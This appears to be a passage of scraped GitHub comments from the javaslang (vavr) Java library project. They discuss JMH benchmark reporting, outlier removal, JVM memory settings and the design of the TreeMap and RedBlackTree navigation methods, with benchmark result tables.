iterations from the final statistics.\nAs a proof of concept, I have updated the current BenchmarkResultAggregator to exclude the 20% iterations with higher and lower throughput.  When calculating the ratios using Warmup=5, Iterations=20, I am getting ratios very similar to those I get using Iterations=50 (i.e. ratio difference between runs is approx 2%)\nRatioCalculator.java.txt\n. Added pull request https://github.com/javaslang/javaslang/pull/1331\n. Another pull request: https://github.com/javaslang/javaslang/pull/1335\n. Yep, please close!\n. There are two reports generated, the usual Ratio report:\n```\nPerformance Ratios\n========================================================================================================================\n  (Outliers removed: 30.00% low end, 10.00% high end)\nRatios slang / \nTarget         Operation   Ratio                                                    10        100       1000      10000 \nListBenchmark  AddAll      slang_persistent/fjava_persistent                     1.59x      1.67x      1.78x      1.85x \nListBenchmark  AddAll      slang_persistent/java_mutable                         1.36x      1.07x      1.11x      1.24x \nListBenchmark  AddAll      slang_persistent/java_mutable_linked                  1.20x      1.24x      1.09x      1.35x \nListBenchmark  AddAll      slang_persistent/pcollections_persistent              0.94x      0.94x      0.91x      1.45x \nListBenchmark  AddAll      slang_persistent/scala_mutable                        1.19x      1.19x      1.13x      1.16x \nListBenchmark  AddAll      slang_persistent/scala_persistent                     0.94x      1.09x      1.19x      1.32x \nListBenchmark  Iterate     slang_persistent/fjava_persistent                     1.12x      1.06x      0.84x      1.44x \nListBenchmark  Iterate     slang_persistent/java_mutable                         0.67x      0.39x      0.27x      0.46x \nListBenchmark  Iterate     slang_persistent/java_mutable_linked                  0.88x      0.61x      1.17x      1.44x \nListBenchmark  Iterate     slang_persistent/pcollections_persistent              0.81x      0.68x      0.88x      1.50x \nListBenchmark  Iterate     slang_persistent/scala_mutable                        1.12x      0.72x      1.09x      1.09x \nListBenchmark  Iterate     slang_persistent/scala_persistent                     1.13x      1.02x      0.98x      1.31x \nRatios  / slang\nTarget         Operation                                             Ratio          10        100       1000      10000 \nListBenchmark  AddAll                    fjava_persistent/slang_persistent       0.63x      0.60x      0.56x      0.54x \nListBenchmark  AddAll                        java_mutable/slang_persistent       0.74x      0.94x      0.90x      0.81x \nListBenchmark  AddAll                 java_mutable_linked/slang_persistent       0.83x      0.81x      0.92x      0.74x \nListBenchmark  AddAll             pcollections_persistent/slang_persistent       1.06x      1.06x      1.09x      0.69x \nListBenchmark  AddAll                       scala_mutable/slang_persistent       0.84x      0.84x      0.88x      0.86x \nListBenchmark  AddAll                    scala_persistent/slang_persistent       1.07x      0.92x      0.84x      0.76x \nListBenchmark  Iterate                   fjava_persistent/slang_persistent       0.89x      0.95x      1.19x      0.69x \nListBenchmark  Iterate                       java_mutable/slang_persistent       1.50x      2.57x      3.65x      2.18x \nListBenchmark  Iterate                java_mutable_linked/slang_persistent       1.14x      1.64x      0.86x      0.69x \nListBenchmark  Iterate            pcollections_persistent/slang_persistent       1.24x      1.47x      1.14x      0.67x \nListBenchmark  Iterate                      scala_mutable/slang_persistent       0.89x      1.38x      0.92x      0.91x \nListBenchmark  Iterate                   scala_persistent/slang_persistent       0.89x      0.98x      1.02x      0.77x \n```\nAnd this is the detailed performance report. It is very similar to the report JMH generates, but with two differences:\n- The error interval is normilised to Error %, so it is easy to spot when something went wrong in a benchmark (i.e. Error % very high)\n- You can compare the ratios against the other implementations. I have found useful when working on improving performance of a method, as I tend to focus on this report.\n```\nDetailed Performance Execution Report\n============================================================================================================================================================================================================================================\n  (Error: \u00b199% confidence interval, expressed as % of Score)\n  (Outliers removed: 30.00% low end, 10.00% high end)\n  (fjava_persistent, java_mutable, java_mutable_linked, pcollections_persistent, scala_mutable, scala_persistent, slang_persistent: read as current row implementation is x times faster than alternative implementation)\nTarget         Operation   Impl                         Params  Count            Score  \u00b1     Error    Unit  fjava_persistent  java_mutable  java_mutable_linked  pcollections_persistent  scala_mutable  scala_persistent  slang_persistent\nListBenchmark  Iterate     slang_persistent              10000     24       43,517.628  \u00b1     0.22%   ops/s            1.44x         0.46x                1.44x                    1.50x          1.09x             1.31x                \nListBenchmark  Iterate     slang_persistent               1000     24      393,333.748  \u00b1     0.15%   ops/s            0.84x         0.27x                1.17x                    0.88x          1.09x             0.98x                \nListBenchmark  Iterate     slang_persistent                100     24    5,157,107.744  \u00b1     0.13%   ops/s            1.06x         0.39x                0.61x                    0.68x          0.72x             1.02x                \nListBenchmark  Iterate     slang_persistent                 10     24   44,498,376.529  \u00b1     0.44%   ops/s            1.12x         0.67x                0.88x                    0.81x          1.12x             1.13x                \nListBenchmark  Iterate     scala_persistent              10000     24       33,342.036  \u00b1     0.85%   ops/s            1.11x         0.35x                1.10x                    1.15x          0.84x                               0.77x\nListBenchmark  Iterate     scala_persistent               1000     24      401,992.610  \u00b1     0.18%   ops/s            0.86x         0.28x                1.19x                    0.90x          1.12x                               1.02x\nListBenchmark  Iterate     scala_persistent                100     24    5,071,539.172  \u00b1     0.09%   ops/s            1.04x         0.38x                0.60x                    0.67x          0.71x                               0.98x\nListBenchmark  Iterate     scala_persistent                 10     24   39,467,891.600  \u00b1     9.15%   ops/s            0.99x         0.59x                0.78x                    0.72x          1.00x                               0.89x\nListBenchmark  Iterate     scala_mutable                 10000     24       39,800.555  \u00b1     0.45%   ops/s            1.32x         0.42x                1.32x                    1.37x                            1.19x             0.91x\nListBenchmark  Iterate     scala_mutable                  1000     24      360,394.261  \u00b1     0.16%   ops/s            0.77x         0.25x                1.07x                    0.81x                            0.90x             0.92x\nListBenchmark  Iterate     scala_mutable                   100     24    7,118,875.758  \u00b1     0.51%   ops/s            1.46x         0.54x                0.84x                    0.94x                            1.40x             1.38x\nListBenchmark  Iterate     scala_mutable                    10     24   39,570,222.840  \u00b1     0.24%   ops/s            0.99x         0.59x                0.78x                    0.72x                            1.00x             0.89x\nListBenchmark  Iterate     pcollections_persistent       10000     24       29,037.785  \u00b1     0.62%   ops/s            0.96x         0.31x                0.96x                                   0.73x             0.87x             0.67x\nListBenchmark  Iterate     pcollections_persistent        1000     24      446,442.762  \u00b1     0.64%   ops/s            0.95x         0.31x                1.32x                                   1.24x             1.11x             1.14x\nListBenchmark  Iterate     pcollections_persistent         100     24    7,578,063.598  \u00b1     0.71%   ops/s            1.55x         0.57x                0.90x                                   1.06x             1.49x             1.47x\nListBenchmark  Iterate     pcollections_persistent          10     24   55,146,163.436  \u00b1     0.38%   ops/s            1.39x         0.83x                1.09x                                   1.39x             1.40x             1.24x\nListBenchmark  Iterate     java_mutable_linked           10000     24       30,232.033  \u00b1     0.33%   ops/s            1.00x         0.32x                                         1.04x          0.76x             0.91x             0.69x\nListBenchmark  Iterate     java_mutable_linked            1000     24      337,021.220  \u00b1     0.35%   ops/s            0.72x         0.23x                                         0.75x          0.94x             0.84x             0.86x\nListBenchmark  Iterate     java_mutable_linked             100     24    8,440,918.825  \u00b1     0.28%   ops/s            1.73x         0.64x                                         1.11x          1.19x             1.66x             1.64x\nListBenchmark  Iterate     java_mutable_linked              10     24   50,665,215.621  \u00b1     0.25%   ops/s            1.27x         0.76x                                         0.92x          1.28x             1.28x             1.14x\nListBenchmark  Iterate     java_mutable                  10000     24       94,708.600  \u00b1     0.48%   ops/s            3.14x                              3.13x                    3.26x          2.38x             2.84x             2.18x\nListBenchmark  Iterate     java_mutable                   1000     24    1,434,882.956  \u00b1     0.28%   ops/s            3.07x                              4.26x                    3.21x          3.98x             3.57x             3.65x\nListBenchmark  Iterate     java_mutable                    100     24   13,253,800.688  \u00b1     0.27%   ops/s            2.71x                              1.57x                    1.75x          1.86x             2.61x             2.57x\nListBenchmark  Iterate     java_mutable                     10     24   66,526,040.662  \u00b1     0.19%   ops/s            1.67x                              1.31x                    1.21x          1.68x             1.69x             1.50x\nListBenchmark  Iterate     fjava_persistent              10000     24       30,164.884  \u00b1     0.57%   ops/s                          0.32x                1.00x                    1.04x          0.76x             0.90x             0.69x\nListBenchmark  Iterate     fjava_persistent               1000     24      467,682.323  \u00b1     0.12%   ops/s                          0.33x                1.39x                    1.05x          1.30x             1.16x             1.19x\nListBenchmark  Iterate     fjava_persistent                100     24    4,887,761.814  \u00b1     0.12%   ops/s                          0.37x                0.58x                    0.64x          0.69x             0.96x             0.95x\nListBenchmark  Iterate     fjava_persistent                 10     24   39,803,232.775  \u00b1     0.19%   ops/s                          0.60x                0.79x                    0.72x          1.01x             1.01x             0.89x\nListBenchmark  AddAll      slang_persistent              10000     24       24,996.473  \u00b1     0.27%   ops/s            1.85x         1.24x                1.35x                    1.45x          1.16x             1.32x                \nListBenchmark  AddAll      slang_persistent               1000     24      232,499.401  \u00b1     6.81%   ops/s            1.78x         1.11x                1.09x                    0.91x          1.13x             1.19x                \nListBenchmark  AddAll      slang_persistent                100     24    2,359,371.993  \u00b1     0.20%   ops/s            1.67x         1.07x                1.24x                    0.94x          1.19x             1.09x                \nListBenchmark  AddAll      slang_persistent                 10     24   22,214,620.156  \u00b1     0.14%   ops/s            1.59x         1.36x                1.20x                    0.94x          1.19x             0.94x                \nListBenchmark  AddAll      scala_persistent              10000     24       18,986.702  \u00b1     0.19%   ops/s            1.40x         0.94x                1.02x                    1.10x          0.88x                               0.76x\nListBenchmark  AddAll      scala_persistent               1000     24      195,793.786  \u00b1     1.92%   ops/s            1.50x         0.93x                0.91x                    0.77x          0.95x                               0.84x\nListBenchmark  AddAll      scala_persistent                100     24    2,159,305.229  \u00b1     0.32%   ops/s            1.53x         0.98x                1.13x                    0.86x          1.09x                               0.92x\nListBenchmark  AddAll      scala_persistent                 10     24   23,672,654.256  \u00b1     0.48%   ops/s            1.70x         1.45x                1.28x                    1.01x          1.27x                               1.07x\nListBenchmark  AddAll      scala_mutable                 10000     24       21,539.175  \u00b1     1.06%   ops/s            1.59x         1.07x                1.16x                    1.25x                            1.13x             0.86x\nListBenchmark  AddAll      scala_mutable                  1000     24      205,385.149  \u00b1     0.16%   ops/s            1.57x         0.98x                0.96x                    0.81x                            1.05x             0.88x\nListBenchmark  AddAll      scala_mutable                   100     24    1,975,936.503  \u00b1     0.81%   ops/s            1.40x         0.89x                1.03x                    0.79x                            0.92x             0.84x\nListBenchmark  AddAll      scala_mutable                    10     24   18,642,147.413  \u00b1     0.32%   ops/s            1.34x         1.14x                1.01x                    0.79x                            0.79x             0.84x\nListBenchmark  AddAll      pcollections_persistent       10000     24       17,252.364  \u00b1     2.53%   ops/s            1.27x         0.86x                0.93x                                   0.80x             0.91x             0.69x\nListBenchmark  AddAll      pcollections_persistent        1000     24      254,516.182  \u00b1     0.77%   ops/s            1.95x         1.21x                1.19x                                   1.24x             1.30x             1.09x\nListBenchmark  AddAll      pcollections_persistent         100     24    2,501,365.049  \u00b1     0.87%   ops/s            1.77x         1.13x                1.31x                                   1.27x             1.16x             1.06x\nListBenchmark  AddAll      pcollections_persistent          10     24   23,516,396.622  \u00b1     0.22%   ops/s            1.69x         1.44x                1.27x                                   1.26x             0.99x             1.06x\nListBenchmark  AddAll      java_mutable_linked           10000     24       18,560.573  \u00b1     0.17%   ops/s            1.37x         0.92x                                         1.08x          0.86x             0.98x             0.74x\nListBenchmark  AddAll      java_mutable_linked            1000     24      214,048.302  \u00b1     0.17%   ops/s            1.64x         1.02x                                         0.84x          1.04x             1.09x             0.92x\nListBenchmark  AddAll      java_mutable_linked             100     24    1,909,235.763  \u00b1     0.17%   ops/s            1.35x         0.86x                                         0.76x          0.97x             0.88x             0.81x\nListBenchmark  AddAll      java_mutable_linked              10     24   18,483,371.308  \u00b1     0.35%   ops/s            1.32x         1.13x                                         0.79x          0.99x             0.78x             0.83x\nListBenchmark  AddAll      java_mutable                  10000     24       20,158.538  \u00b1     0.35%   ops/s            1.49x                              1.09x                    1.17x          0.94x             1.06x             0.81x\nListBenchmark  AddAll      java_mutable                   1000     24      210,120.395  \u00b1     1.73%   ops/s            1.61x                              0.98x                    0.83x          1.02x             1.07x             0.90x\nListBenchmark  AddAll      java_mutable                    100     24    2,212,428.191  \u00b1     0.15%   ops/s            1.56x                              1.16x                    0.88x          1.12x             1.02x             0.94x\nListBenchmark  AddAll      java_mutable                     10     24   16,341,739.366  \u00b1     0.29%   ops/s            1.17x                              0.88x                    0.69x          0.88x             0.69x             0.74x\nListBenchmark  AddAll      fjava_persistent              10000     24       13,541.196  \u00b1     1.54%   ops/s                          0.67x                0.73x                    0.78x          0.63x             0.71x             0.54x\nListBenchmark  AddAll      fjava_persistent               1000     24      130,750.028  \u00b1     0.23%   ops/s                          0.62x                0.61x                    0.51x          0.64x             0.67x             0.56x\nListBenchmark  AddAll      fjava_persistent                100     24    1,413,718.185  \u00b1     0.25%   ops/s                          0.64x                0.74x                    0.57x          0.72x             0.65x             0.60x\nListBenchmark  AddAll      fjava_persistent                 10     24   13,953,361.343  \u00b1     0.17%   ops/s                          0.85x                0.75x                    0.59x          0.75x             0.59x             0.63x\n```\n. @paplorinc  @danieldietrich I don't think I will have much time for writing the article, but I am happy to help.\nPersonally, I think it is important for JavaSlang to benchmark all its collections and make the results public in a comprehensive manner. First, it will allow the dev team to identify underperforming operations and focus efforts on improving overall performance. Second, it will also be a good \"marketing tool\" and show devs take performance seriously. \n. I also removed BenchmarkResultAggregator as it has been superseded by BenchmarkPerformanceReporter\n. I have updated the pull request with @paplorinc comments.\nI also changed the JmhRunner methods to make them shorter (i.e. removed AndReport part as it is redundant). I have also added a JmhRunner.devRunWithAssertions method to make it clear when assertions are turned on.\nRegarding the JVM memory setup, I am still having doubts whether we should configure the JVM with  NewGen=100%. Yes, I agree this configuration generates no GC in all of our current benchmarks, which is a good thing! (one less variable to worry about). \nHowever, I have this little fella in my head that keeps telling me it doesn't \"feel natural\" (ok, kinda weird reason, I admit). Also, we might run into massive problems if one of our benchmarks uses more than 4Gb memory on each iteration. At the moment the ListBenchmark is using up over 2.5Gb for each 500ms iteration on my 3 year old PC. A faster PC might just push through the 4Gb threshold.  Also, I was expecting that by removing the GC we would reduce the swings among iterations considerably. This however doesn't seem to be the case, which is disappointing.\n. @paplorinc we have three JmhRunner methods :\n- run - 5 secs warmup and 20 secs measurement (default)\n- devRun - 2.5 secs warmup and 5 secs measurement\n- devRunWithAssertions - same as devRun but running with assertions\nHave you seen the latest? Are you still concerned about this?\n. run and devRun run without assertions\n. @paplorinc Can you answer the above? What is you concern?\n@danieldietrich Can we please merge?\n. @ruslansennov Good catch!!!\nI remember having fixed that issue, so I have spent a little while scratching my head how on earth is not in master!\nAs it turns out, I fixed it in the branch of the other pull request https://github.com/javaslang/javaslang/pull/1317\n. This PR looks good to me aside from few comments.\nThe benchmark suite and reports start to look very good.  Still a few structures and operations missing, but it is looking very promising. Good work @paplorinc!\n. ... albeit Java 10 is not due until at least 2019/20\nThis is how I see it:\nPros:\n- Much more efficient collections for primitives \n- Another differentiator from other competing libraries. \nCons:\n- Pollution with parallel hierarchies of the same structures\n- Increased javaslang jar size\nMy suggestion is to first complete the suite of JMH benchmarks and then try to make the existing collections as efficient as possible. After that, if we feel the pros outweigh the cons, then let's go for it!\n. These changes sound very good, specially replacing the Empty node for null (yeah, null, I know, but sometimes it is ok to embrace \"evil\" in a controlled manner if \"you know what you are doing\"!).\nThe only issue I see with making RedBlackTree a final class instead of an interface is that it might not work if you want to support sub trees efficiently (i.e. as a view of another tree as my implementation in #1317).  To support sub views, it would make more sense for RedBlackTree to continue being an interface, and then have two implementing classes: Node and SubTreeView. \nOf course, if you are thinking in implementing sub views by just creating a brand new tree, then this design will work. However. creating a sub view will be a very expensive operation, and in my view javaslang will be at a disadvantage versus the java.util implementation.. Would it be worth adding benchmark tests for the java.util.PriorityQueue counterpart methods as well? In that way we will be able to see at a glance how fast/slow our implementation is in relation with the existing java.util library?\nI have done this for the TreeMapBenchmark (still under development) and it works very well.  I have used use method names such as \"listHeadSlang\" and \"listHeadJava\" (as opposed to \"slangListHead\"). In that way the performance report shows related Slang/Java implementations together, and thus easy to compare.\nAs a matter of fact, I have also been thinking in adding Scala immutable benchmark tests.\nAlso, I would use parameter \"10\" instead of \"1\". We want to cover the common use case of having \"a few elements\" in the PriorityQueue. 1 is probably too few, while 100 is \"a few\" too many.\n. What is the performance of the current implementation vs java.util.PriorityQuote after fixing comparator instanceof SerializableComparator?  Any methods in particular?\nBy the way, you are calling the PriorityQueueBase#with method very frequently, which in turns ends up creating a new priority queue object using the the PriorityQueueBase constructor, which in turns always casts the comparator to SerializableComparator. This operation is unnecessary when you call PriorityQueueBase#with internally, as you know the comparator is already a SerializableComparator. It might be worth overloading the constructor.\n. What is the rationale behind storing a list of trees? (I know the answer is in the code, I just haven't had the time to dig too deeply). Does each element in the list has a tree of nodes with same rank?\n. I see... you are right, that version of org.scalaz doesn't run with the latest org.scala-lang.\nIs it really worth testing against org.scalaz, given it seems to be so highly under performing?\nI personally find the comparison against the Scala implementation more meaningful, and hence I would prefer to control explicitly the Scala version. However, if the org.scalaz comparison is a must, then yeah, we are at the mercy of that library.\nWouldn't it be more useful to test against other implementations such as Functional Java or PCollections instead?\n. Will do! :)\nI actually started working on this class well before I saw your aggregator, and then by the time I added the aggregators you didn't support groups.\n. I was actually thinking in increasing the number of measurements to at least 10! JMH uses the T-distribution to calculate confidence intervals. The more measurements the more meaningful the results.\nMaybe I'll do 5 warmups and 10 measurements.\n. yeah, good catch, that -ea flag and the assert you picked on below just escaped the clean-up cull. I'll get rid of them.\n. I don't need to lock down the Random here, as I first calculate the keys into keysRandom, and then use that array to generate the maps with same contents (i.e. slangTreeMap, javaTreeMap and scalaTreeMap). \n. Remember the state has Level.Iteration, hence it is only rebuilt once per iteration and then reused by thousands of tests. By rebuilding it every time I also ensure all tree implementations are setup with exactly the same contents (because I don't lock the Random). \nThe reason why I didn't want to lock the Random is because depending how items are inserted into the map, you will end up with a different tree topology.  If I locked the random, it is possible that a particular implementation might \"get lucky\" with that topology. \n. Ok, fair point, although I would have thought the random calculation is quite fast anyway. Having said that, as all implementations follow the same approach, they will all incur the same \"extra cost\" of calculating the next random value, so it should cancel itself out.\n. They are not! :)\nHowever, I am relying in Random Theory here. If we execute thousands or million of tests per iteration as it is the case here, then the sample mean will tend towards the true mean.\n. This is as per the current JDK implementation \nhttps://docs.oracle.com/javase/8/docs/api/java/util/TreeMap.html#subMap-K-boolean-K-boolean-\nYou can also use an alternative subMap method without flags (defaults to fromInclusive=true and toInclusive=false)\n. yes... and no :)\nThis null is used for search operations only as the comparator only relies on the key, and the value is not known.  That null is simply ignored by the comparison.\nMaybe I could create a constant Object IGNORED=null and use it instead.\n. Whiskey always helps here :D\n. lol, what is wrong with Aaron?  Haven't you watched Coach Carter? ;)\nWould you find it clearer if instead of names I used these?\nprivate final Tuple2<Integer, String> one = Tuple.of(1, \"one\");\n    private final Tuple2<Integer, String> three = Tuple.of(3, \"three\");\n    private final Tuple2<Integer, String> five = Tuple.of(5, \"five\");\n    private final Tuple2<Integer, String> seven = Tuple.of(7, \"sever\");\n. I found that by reducing the number of groups, the benchmark runs considerably faster (i.e. less warm-ups, forks and state creation), hence I decided to group related operations together and reduce number of groups. Get and Put are related in that they are complementary operations.\nPlease note that the BenchmarkPerformanceReporter is \"intelligent\" enough to recognise different implementations of the same operation. So you can group related operations \ninto the same group, and they will not get mixed up in the performance report.\nThe BenchmarkPerformanceReporter expects the following method name convention:\nvoid testoperation_implementation()\nSo if you have the following methods in the same group: get_Java(), get_Scala(), get_Slang(), put_Java() and put_Slang(), you will get a report like this one:\n```\n                                     10       1000     100000                                  \nGetAndPut  get    Java/Slang      1.33x      1.22x      1.24x \nGetAndPut  get   Scala/Slang      1.21x      1.21x      1.58x \nGetAndPut  put    Java/Slang      1.21x      1.21x      1.58x \n```\n. Not sure I follow, what do you mean by \"half Map\"?. \nWe need to store both the key and the value, but we only search by key.\nBoth TreeMap and TreeSet use RedBlackTree as the backing structure.  RedBlackTree only understands about node values and a comparators. TreeMap stores the key/value pairs as Tuple2 objects, and modifies the key comparator to work on those Tuple2 objects. That updated comparator only uses the key part of the tuple. The value part is unknown.\n. Would you find it clearer if I did this:\n```\n    @Override\n    public Option> floor(K key) {\n        return entries.floor(createKey(key));\n    }\nprivate Tuple2<K, V> createKey(K key) {\n   return Tuple.of(key, null);\n}\n\n```\n. https://docs.oracle.com/javase/8/docs/api/java/util/TreeMap.html#tailMap-K-boolean-  ;)\nI take your point with using flags as parameters. We are however just following the current java.util.TreeMap interface.\n. Because we don't have the value ;)\nThe input parameter is a key and the output parameter is the key/value pair that meets the floor condition: highest key lower or equal than the key provided.\nIt will be easier to understand if you look at the get(K key) implementation. It receives a key as parameter and returns the key/value pair for that key. It is the same idea for the other methods:\n@Override\n    public Option<V> get(K key) {\n        final V ignored = null;\n        return entries.find(new Tuple2<>(key, ignored)).map(Tuple2::_2);\n    }\nAlso remember that TreeMap is just a thin wrapper around RedBlackTree.\n. I think it will be clearer if you pull the code and investigate ;)\nLook at the get(K key) method, it is easier to understand.\nWhat you need to think about is that RedBlackTree is using generics to parameterise the node values. TreeMap<K, V> uses a Tuple2<K, V> to store both the key and the value in RedBlackTree<Tuple2<K, V>>.  To search for values in RedBlackTree, however, we only have the key.  For that we use an instance of TreeMap.EntryComparator<Tuple2<K, V>>\n. The whole point of this feature was to provide support for these operations available in java.util.TreeMap. The scala TreeMap implementation does not support ceiling/floor/subMap/tailMap/headMap/descendingIterator. Using your reasoning, we shouldn't implement any of them. \nHowever, why shouldn't we? Having navigable methods in a sorted set or map is a very important feature in my opinion.\nWhat alternative signature would you suggest for these methods:\n- subMap(K fromKey, boolean fromInclusive, K toKey, boolean toInclusive\n- subMap(K fromKey, K toKey)\n- headMap(K toKey, boolean inclusive)\n- headMap(K toKey)\n- tailMap(K fromKey, boolean inclusive)\n- tailMap(K fromKey)\n. good catch!\n. The idea here was to have two types of benchmark executions: the more reliable version (runAndReport), and the less reliable but quicker version to use during development (devRunAndReport).\nI thought that during development we would want to run with assertions on, and given we are not that bothered about reliability, it wouldn't be a major issue.\nIf you prefer, we could create a third method to make it explicit: devRunAndReportWithAssertions. Or if you prefer, we could also shorten the names of all three methods by removing the AndReport.\n. And by the way, is there any reason why we use assertEquals instead of assertions in ListBenchmark?\nAlso, I think that asserting on size() might be very expensive. \n. I understand the rationale of changing NewGen to 100% of the heap.  I must admit, however, it makes me a bit uneasy, as it is an artificial setup.  However, I agree that in theory by removing all GCs we should get stable results.\nI did a quick test. I ran the devRunAndReport on ListBenchmark with container size = 10000 and a 4Gb heap. The first run with default NewGen size, and the second with NewGen size=100%.  No GC was triggered in the second run. \nHowever, to my surprise, there were still considerable swings from iteration to iteration, so not sure what to make of these results. \nFirst run, normal NewGen:\nTarget         Operation   Impl                         Params  Count            Score  \u00b1     Error  \nListBenchmark  Iterate     slang_persistent              10000      6       32,704.013  \u00b1     4.23%  \nListBenchmark  Iterate     scala_persistent              10000      6       35,181.237  \u00b1     1.87%  \nListBenchmark  Iterate     scala_mutable                 10000      6       41,459.476  \u00b1     2.74%  \nListBenchmark  Iterate     pcollections_persistent       10000      6       30,591.533  \u00b1     7.57%  \nListBenchmark  Iterate     java_mutable_linked           10000      6       28,613.690  \u00b1    12.88%  \nListBenchmark  Iterate     java_mutable                  10000      6       90,556.997  \u00b1     6.98%  \nListBenchmark  Iterate     fjava_persistent              10000      6       35,779.948  \u00b1     5.46%  \nListBenchmark  AddAll      slang_persistent              10000      6       26,124.064  \u00b1    20.22%  \nListBenchmark  AddAll      scala_persistent              10000      6       20,810.554  \u00b1     9.16%  \nListBenchmark  AddAll      scala_mutable                 10000      6       20,356.731  \u00b1     1.28%  \nListBenchmark  AddAll      pcollections_persistent       10000      6       22,217.533  \u00b1    36.81%  \nListBenchmark  AddAll      java_mutable_linked           10000      6       21,513.086  \u00b1    20.40%  \nListBenchmark  AddAll      java_mutable                  10000      6       23,199.166  \u00b1    52.08%  \nListBenchmark  AddAll      fjava_persistent              10000      6       14,222.033  \u00b1     3.23%\nSecond run, NewGen = 100%\nTarget         Operation   Impl                         Params  Count            Score  \u00b1     Error  \nListBenchmark  Iterate     slang_persistent              10000      6       25,462.352  \u00b1     1.42%  \nListBenchmark  Iterate     scala_persistent              10000      6       25,151.763  \u00b1     2.27%  \nListBenchmark  Iterate     scala_mutable                 10000      6       44,893.597  \u00b1     4.30%  \nListBenchmark  Iterate     pcollections_persistent       10000      6       25,520.437  \u00b1     4.26%  \nListBenchmark  Iterate     java_mutable_linked           10000      6       30,922.490  \u00b1     4.99%  \nListBenchmark  Iterate     java_mutable                  10000      6      112,805.879  \u00b1     4.02%  \nListBenchmark  Iterate     fjava_persistent              10000      6       24,831.025  \u00b1     9.02%  \nListBenchmark  AddAll      slang_persistent              10000      6       26,400.629  \u00b1    17.79%  \nListBenchmark  AddAll      scala_persistent              10000      6       21,334.084  \u00b1     4.55%  \nListBenchmark  AddAll      scala_mutable                 10000      6       19,364.354  \u00b1     9.11%  \nListBenchmark  AddAll      pcollections_persistent       10000      6       23,310.641  \u00b1    45.25%  \nListBenchmark  AddAll      java_mutable_linked           10000      6       22,698.641  \u00b1    31.58%  \nListBenchmark  AddAll      java_mutable                  10000      6       23,148.883  \u00b1    50.05%  \nListBenchmark  AddAll      fjava_persistent              10000      6       14,240.217  \u00b1     2.97%\n. Do we need asserts in the production code? \nI don't see the need if we have proper junit coverage.\n. But I agree, there are several expensive looking assertions in the PriorityQueueBenchmark, such as this one:\nassertEquals(values.values().map(Traversable::size).sum().intValue(), CONTAINER_SIZE)\nI don't mind assertions in the Benchmark classes, as we don't have junits for them. \nI think, however, we should always use assert instead of assertEquals, as the latter always gets executed.\n. If you want to assert for internal state consistency, I don't think you should rely on assert, as it can be disabled thus leaving the internal state compromised.\n. We need it for proper statistical analysis imo. Even without GC, the swings are still considerable and therefore when running with 10 iterations the margin of error is still high.  Also remember each iteration is just 500ms.\nI think it is ok to use JmhRunner.devRun during development for quick feedback (10 iterations). \nHowever, if we are gathering reports for publication or to want to make certain decisions, I think 40 is a good number.\n. Ah, good point. I actually wanted to talk about this one. No, 10000 is not unrealistic. I just think we should be consistent across all Benchmarks. \nI would personally use 10, 100, 1000, 10000 and 100000.  But then benchmarks will take forever (as we know). So the question is which ones we want to use across the board? and which ones?\n. I have added Class<?> now. \nI left it out because it is not needed and doesn't give you anything. A different story would have been if we were using Class<? extends Benchmark>. However, I concede Class<?> is more accurate as Class<> is a parameterized class. \n. Understood.\nThe idea was to make them polymorphic and avoid casting from RedBlackTree to ValueNode all the time (performance enhancement + cleaner code). Also, after creating the AbstractSubTreeView for the sub views, I had to move the node specific methods from RedBlackTree into the Node interface, so it made little sense to keep those static operations in RedBlackTree anyway.\nI didn't change the logic in those static methods. My original idea was to turn them into instance methods. But the logic inside those methods is too complicated so I decided to leave it for another PR. The only changes I made was to use the more specific ValueNode interface instead of RedBlackTree to avoid casting, and let IntelliJ automatic refactoring tidy up here and there.\n. - Return TreeMap instead of SortedSet\n  I will do. Returning TreeMap makes the interface nicer to use (you were working with a TreeMap, and after the operation, you continue working with another TreeMap)\n- Sort methods alphabetically\n  Sorry, I wasn't aware that was the convention. I personally prefer sorting methods by responsibility, i.e. headMap and tailMap are closely related and thus should be together.  But it is far more important to be consistent, so if everything else is sorted alphabetically, we should continue doing so.\n. The main reason for the hierarchy refactoring was to introduce the sub views.  There are several operations that ValueNode and Empty need that are not relevant to the sub views (everything in Node interface)\nMy intention was to fully remove the type casts and make the implementation fully polymorphic. At one point, however, I realised the change was already considerable big and complex, and it would be best to leave it for another PR (I'll be happy to do after this PR is out of the way). \nTo completely remove the type cast, we need to turn the static methods in ValueNode (that I moved from RedBlackTree) into instance methods, and add those methods to the Node interface.\n. Shouldn't this be withAsserts instead of WITH_ASSERTS?\nI find it misleading, as I would expect upper case for constants only.\n. I also have few reservations about this require call. I personally prefer assert\nWhat is the overhead introduced by creating the lambda + making the call in very quick O(1) complexity operations?  If, let's say, the achieve 10M operations/second, we will also be creating 10M lambdas + making 10M calls to require.  I know that the overhead with asserts will be zero, but I cannot say the same about require.\n. The problem with asserts was that production code could contain asserts also, making the benchmark totally unrealistic.\nCouldn't we just turn on assertions on the benchmark package?\n. I like this change. This allows us to selectively run groups of tests (useful during development) without having to comment out large areas of the code, which was very messy.\n. This is a trick that JMH suggests to avoid Dead Code Elimination, as @paplorinc mentioned.\nThe other option would be to use Blackholes\nhttp://hg.openjdk.java.net/code-tools/jmh/file/13ae22114e22/jmh-samples/src/main/java/org/openjdk/jmh/samples/JMHSample_08_DeadCode.java\n. As stated before, personally I would use camel case names here, as the convention is upper case for constants only.\n. Why do you need to use reflection for?\n. How reliable is to measure memory usage in a JVM?  Are we disabling GC?\n. ",
    "mind-blowing": "Hi Daniel,\nThanks for suggestion, didn't know about CharSeq.of(\"Hello\");, next time I will ask in Gitter before creating PR :smile:.\n. ",
    "michaela-elschner": "Hi all, any chances we can get these features any time soon?\nThis is really something missing to make the SortedMap much more useful.\nCurrently I am traversing the whole map to get the required information, but I don\u2019t like that \ud83d\ude09\nI have already been thinking about using Scala TreeMap in my Java project for it's support of # range. But that's ugly also.\nSo I am really looking forward to vavr to implement these \ud83d\ude42. Hi all, any chances we can get these features any time soon?\nThis is really something missing to make the SortedMap much more useful.\nCurrently I am traversing the whole map to get the required information, but I don\u2019t like that \ud83d\ude09\nI have already been thinking about using Scala TreeMap in my Java project for it's support of # range. But that's ugly also.\nSo I am really looking forward to vavr to implement these \ud83d\ude42\n. ",
